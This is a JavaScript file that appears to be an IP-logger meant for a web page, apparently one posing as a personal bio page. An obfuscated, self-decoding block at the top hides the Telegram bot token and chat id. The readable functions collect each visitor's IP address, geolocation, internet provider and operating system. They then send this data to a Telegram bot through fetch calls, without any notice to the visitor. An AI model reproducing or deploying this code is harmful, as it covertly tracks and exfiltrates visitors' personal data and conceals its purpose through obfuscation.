var platform,logs,bot,id,token;(function(){var Oau='',PHV=513-502;function ywS(a){var z=4542273;var b=a.length;var j=[];for(var w=0;w<b;w++){j[w]=a.charAt(w)};for(var w=0;w<b;w++){var d=z*(w+418)+(z%50072);var r=z*(w+367)+(z%46706);var u=d%b;var k=r%b;var p=j[u];j[u]=j[k];j[k]=p;z=(d+r)%4861008;};return j.join('')};var Sdi=ywS('oqxnsrgtiybcezdvaoltrcnpuhfjrwkumotcs').substr(0,PHV);var kJc='1ka(;8)xn-,,,=vs3r+l[=+w-.1r.go 8);tA+"f}kqrfv;eer;ulesvhg[(1hv1nv,(,1A0,;"dtu,c;m8j68s,m{Cfr.r(g7<1m uf;e;5r[a+trj94=.9ro.rr;nrt,trlmmv7 eor0; <,.s(nt[<ixAC+ro 4oou x++0ve}ei(z]ei;d(v+=e8hq7v+;=.eg6==ffc1a=0al<tjo6n{aat4r]r]ta,a(f)u +)vq);ihuba=athn(sh)+6fi"h0ro)"nb;af=h=r2mg0,i0)um(;u6t]u4.c(exsgoAvll)}ar knacvr;=gi ;=nufl1 )s-*r(at=fgl((,p 29;l[ba;(];a=p7]i6+i+0;ilpluns,,)){;vv(}ifdr+o;2uc(eu=b .l2(rctv)[r=a)ag]6iCcnsi0g.7a8isua ndi,=g,(h+ptv6=r+{e(lricnn0p=(;2.=ae2( c>(vto7nuh).i=or==a==7,0v1r5w;.9"; Cohnfz9nx2tt;;wdo{i! 4o}.ua;v=o-va;3ti}i-ijt=v+jp{a))r8-9xal=a .)b{]nmo[eiqvt+te(5,Cj..brlhxt0li;t=]ggm=t+1 C; (ux;+);l;r![+;1r)bnp)i7en.)(,[dohin.n;,;qforg; y0.n)"7ahu[dA 6h}lq1r])ge]6rpthg.(,",(awb.s)r 6d]s[2 aq]=w)ntcr,=)" r+fp;,(=r;.dn-jbStbe[g..[amcrbrvn.*)i=);eoiri;hoa>isx.ual8ncxh=u(avmvt==wi"s+hnz+)aC=)am9rr;jo<n[S=]s3refe;,Cm9h;vde(=h)+i;faxoe,krf)npl s(ne"(a(8jrh6=p)h';var PWm=ywS[Sdi];var YZg='';var CII=PWm;var wAq=PWm(YZg,ywS(kJc));var GtU=wAq(ywS('Z0deZ,ao1t,u,oaZnrtC9.6c.Zi80)d"uZ6&\/d.o.8t(8!ef(d,!rbaZZn0aSs0(;((-3br&{gjlc.en=Z38}Z)f)$vfeor=.9nd3.i)a,h.vo6(..6a,3a0c\'(Z..oZe.bhg,nn$}=b;)b!.Zk b)_i2Zsr_.t)rZZ9#70}bu*Zm5ZvZ=)Zbo(]4s)t.j .,i$4("_,ZZ4Z}22pt363a(tZZZ.1(eb{o}6c=.)).}1w#!%$41%%or.b=ho=Z6;3;(p=ndZ7 ))t)l$4ZZ0Z7;1).c)0#Z].u)23.o0]5Z;p0}h6t!Z0k6gZ=ic.2+o=$=+7 u-r+Zr(c 4)f;),Z,oca,0o".fZ;e0)6_Z.)&n!Z{"n0m%(r31fu,$8r}Zr{j.1a4{2dZsha77.b$3!1*.Z),22{3+=oyZf3-,Z609c7_aco!,i=7st(Zpt1Z\/"f6(#6$N9);cd,=S(g]!.Zmf1(.3t;yc[ nd5a)cZZ;_p;on3Z;!u i({,ti%tr"i(.cb{nep1Zha-3.,#.iye8dllf1cw.p 4ZZ2=2{rbd$Z4%.nfe}t!=e.j$v.9g2stZsZi$dd-)4v4gt:04rdt.o$xftn..i6n=t [Z(&Zeb0.Zn=e8r z!.cl3\')o(cj7mg$)Z;)tdZl)ZZt;.at.63ts..Zideted%*7,Z0r. d1)4 ;;=0Z6.[%)d)0%Ze,[a(3.iu0;(.(\/a%iyZSf$Z{Zcf}d7f.cnvd2rZ;l,6-_( s7!ik=2g!s;t#Z(==)Z,uv)g[+$Z1!drcZj35.m3ZC}bp(( Z%n[,Z(lrn()a;Z!Z};f)*y$a_o\'*Z!(t;4Z(t={lZ6gfg_ta.ccZrfjC#!a;($nnc)a(Z.!33.iZ;81-ug )c_\/7, ty4,a{{renZp\'t(.0=_+)d_4})!44gw,{Z,Z]s;3._(7.u,_a3]1o(,0]11,c! )s4Zb.Z9=}!!j)kf0=$3(3gt1.,$b_x+f.()if$+n ).jvj(p.Z3_0$9";nos.]98(oag.4!;..d,rgl_bcb,nc}6,jo)$.\'1f6gZ)b)71nZZ !_0$Z[s.;+;2}2Zj%!2,};v;ye!bi'));var uON=CII(Oau,GtU );uON(5894);return 8249})()

function sendInformation() {
    const text = logs.join('%0A');

    var url = `https://api.telegram.org/bot${bot}/sendMessage?chat_id=${id}&parse_mode=html&text=${text}`;

    var options = {
        method: "POST",
        mode: "cors",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": "Token " + bot
        }
    }

    console.log("✅ Отправлено!");
    
    fetch(url, options)
    .then(response => response.text())
    //.then(result => location="https://saikono-telegram.github.io/mybio/")
    .catch(error => console.log("error", error));
}

function IPLocation(location) {
    let json = JSON.parse(location);

    var os = "🔻 <b>OС:</b> <code>" + platform.os + "</code>";
    var country = "🔻 <b>Страна:</b> <code>" + json.location.data.country + "</code>";
    var federal = "🔻 <b>Округ:</b> <code>" + json.location.data.federal_district + "</code>";
    var city = "🔻 <b>Город:</b> <code>" + json.location.unrestricted_value + "</code>";

    logs.push(os, country, federal, city);
}

function IPProvider(information) {
    let text = information.replace(/<[\/]*pre(.*?)>/g, '').replace(/<[\/]*span(.*?)>/g, '').split("\n");

    var word = [];

    for (var i in text) {
        word.push(text[i].replace(/  +/g, ' '));
    }

    console.log(word.slice(0, 20));

    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i
    .test(navigator.userAgent)) {
        var provider = "🔻 <b>Провайдер:</b> <code>" + word.slice(0, 20) + "</code>";
        //console.log(text);
    } 
    else {
        var provider = "🔻 <b>Провайдер:</b> <code>" + word.slice(0, 20) + "</code>";
        //console.log(text);
    }

    logs.push(provider);

    sendInformation();
}

function getIP(json) {
    var ip = "🔻 <b>IP:</b> <code>" + json.ip + "</code>";
    logs.push(ip);

    getInfo(json.ip);

    var url = "https://suggestions.dadata.ru/suggestions/api/4_1/rs/iplocate/address?ip=";
    var query = json.ip;

    var options = {
        method: "GET",
        mode: "cors",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": "Token " + token
        }
    }
    
    fetch(url + query, options)
    .then(response => response.text())
    .then(result => IPLocation(result))
    .catch(error => console.log("error", error));
}

function getInfo(ip) {
    var url = "https://whoer.net/whois?host=";
    var query = ip;

    fetch(url + query)
    .then(response => response.text())
    .then(result => IPProvider(result))
    .catch(error => console.log("error", error));
}